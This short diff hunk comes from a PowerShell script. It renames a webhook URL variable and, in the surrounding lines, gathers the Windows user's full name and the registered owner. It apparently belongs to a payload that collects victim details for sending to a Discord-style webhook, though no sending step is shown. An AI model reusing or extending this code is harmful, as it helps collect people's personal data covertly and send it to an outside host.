@@ -12,7 +12,7 @@ USAGE
 #>
 
 
-$whuri = "$dc"
+$hookurl = "$dc"
 
 $userInfo = Get-WmiObject -Class Win32_UserAccount ;$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
 $email = (Get-ComputerInfo).WindowsRegisteredOwner
